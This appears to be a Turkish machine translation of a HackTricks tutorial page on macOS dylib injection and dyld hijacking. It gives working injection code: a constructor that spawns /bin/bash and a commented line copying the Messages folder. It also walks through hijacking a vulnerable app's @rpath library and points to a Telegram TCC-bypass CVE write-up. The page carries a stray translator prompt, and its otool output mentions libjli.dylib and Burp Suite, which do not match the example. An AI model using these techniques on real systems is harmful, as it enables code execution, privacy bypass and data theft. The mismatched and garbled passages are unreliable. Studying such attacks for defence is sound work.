# macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES

{{#include ../../../../banners/hacktricks-training.md}}

## DYLD_INSERT_LIBRARIES Temel örneği

**Shell çalıştırmak için inject edilecek Library:**
```c
// gcc -dynamiclib -o inject.dylib inject.c

#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
printf("[+] dylib injected in %s\n", argv[0]);
execv("/bin/bash", 0);
//system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```
Saldırı yapılacak binary:
```c
// gcc hello.c -o hello
#include <stdio.h>

int main()
{
printf("Hello, World!\n");
return 0;
}
```
Injection:
```bash
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Dyld Hijacking Örneği

Hedeflenen güvenlik açığı bulunan binary `/Applications/VulnDyld.app/Contents/Resources/lib/binary` konumundadır.

{{#tabs}}
{{#tab name="entitlements"}}

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>[...]com.apple.security.cs.disable-library-validation[...]
</strong></code></pre>

{{#endtab}}

{{#tab name="LC_RPATH"}}
```bash
# Check where are the @rpath locations
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
cmd LC_RPATH
cmdsize 32
path @loader_path/. (offset 12)
--
cmd LC_RPATH
cmdsize 32
path @loader_path/../lib2 (offset 12)
```
{{#endtab}}

{{#tab name="@rpath"}}
```bash
# Check libraries loaded using @rpath and the versions used
otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
name @rpath/lib.dylib (offset 24)
time stamp 2 Thu Jan  1 01:00:02 1970
current version 1.0.0
compatibility version 1.0.0
# Check the versions
```
{{#endtab}}
{{#endtabs}}

Önceki bilgilerle, **yüklenen library'lerin signature'ını kontrol etmediğini** ve **şuradan bir library yüklemeye çalıştığını** biliyoruz:

- `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
- `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`

Ancak birincisi mevcut değil:
```bash
pwd
/Applications/VulnDyld.app

find ./ -name lib.dylib
./Contents/Resources/lib2/lib.dylib
```
Dolayısıyla onu ele geçirmek mümkün! Meşru kütüphaneyle aynı işlevleri yeniden dışa aktararak **bazı keyfi kodları çalıştıran ve aynı işlevleri dışa aktaran** bir library oluşturun. Ayrıca onu beklenen sürümlerle derlemeyi unutmayın:
```objectivec:lib.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"[+] dylib hijacked in %s", argv[0]);
}
```
Lütfen çevrilecek Markdown içeriğini buraya yapıştırın.
```bash
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
# Note the versions and the reexport
```
Kitaplıkta oluşturulan reexport path, loader'a göreli bir yoldur; bunu export edilecek kitaplığa giden mutlak bir path ile değiştirelim:
```bash
#Check relative
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 48
name @rpath/libjli.dylib (offset 24)

#Change the location of the library absolute to absolute path
install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib

# Check again
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
cmd LC_REEXPORT_DYLIB
cmdsize 128
name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
Son olarak, onu **ele geçirilmiş konuma** kopyalayın:
```bash
cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
```
Ve **binary'yi çalıştırın** ve **library'nin yüklendiğini kontrol edin**:

<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
</strong>Usage: [...]
</code></pre>

> [!TIP]
> Telegram'ın camera izinlerini kötüye kullanmak için bu vulnerability'nin nasıl abuse edilebileceğiyle ilgili güzel bir writeup [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) adresinde bulunabilir. <sup>[[1]](#references)</sup>

## Daha Büyük Ölçek

Beklenmeyen binary'lere library inject etmeyi denemeyi planlıyorsanız, library'nin bir process içine ne zaman yüklendiğini öğrenmek için event mesajlarını kontrol edebilirsiniz (bu durumda `printf` ve `/bin/bash` çalıştırmasını kaldırın).
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
## References

- [1] [CVE-2023-26818 - macOS'ta Telegram ile TCC'yi Bypass Etme](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
{{#include ../../../../banners/hacktricks-training.md}}
